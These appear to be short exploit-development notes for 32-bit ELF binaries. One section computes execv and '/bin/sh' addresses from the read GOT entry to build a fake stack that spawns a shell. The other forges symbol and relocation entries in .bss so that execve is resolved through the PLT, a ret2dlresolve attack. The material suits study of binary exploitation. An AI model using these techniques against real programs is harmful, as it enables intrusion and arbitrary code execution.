Memory leakless exploit
=======================

We want to call an execv.

read_offset = 000e3e10
offset_execv_read = 000bd890 - read_offset
offset_binsh_read = 00166046 - read_offset

execv_address = *(read_got) + offset_execv_read
final_return = 0xdeadb00b
binsh_address = *(read_got) + offset_binsh_read
pointer_to_null = 08048008

new_stack = .bss + 1024

Steps of the attack:

1. int *new_stack = writable_position + exploit_size
2. writemem(new_stack--, pointer_to_null)
3. mem_to_mem(read_got, new_stack)
4. add(new_stack--, offset_binsh_read)
5. writemem(new_stack--, final_return)
6. mem_to_mem(read_got, new_stack)
7. add(new_stack--, offset_execv_read)

libcless exploit
================

char *buffer = .bss;
char *new_stack = buffer + 1024;
int *rubbish = new_stack + 4;

strcpy(buffer, "execve");
  *((int *) buffer) = 'exec';
  *(((int *) buffer) + 1) = 've\0\0';  
char *name = buffer;
buffer += strlen(buffer) + 1;

Elf32_Sym *symbol = (Elf32_Sym *) buffer;
symbol->st_name = name - .dynstr;
symbol->st_value = 0;
symbol->st_info = 0;
symbol->st_other = 0;
symbol->st_shndx = 0;
buffer += sizeof(*symbol);

Elf32_Rel *reloc = (Elf32_Rel *) buffer;
reloc->r_offset = rubbish++;
reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
buffer += sizeof(reloc):

pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));
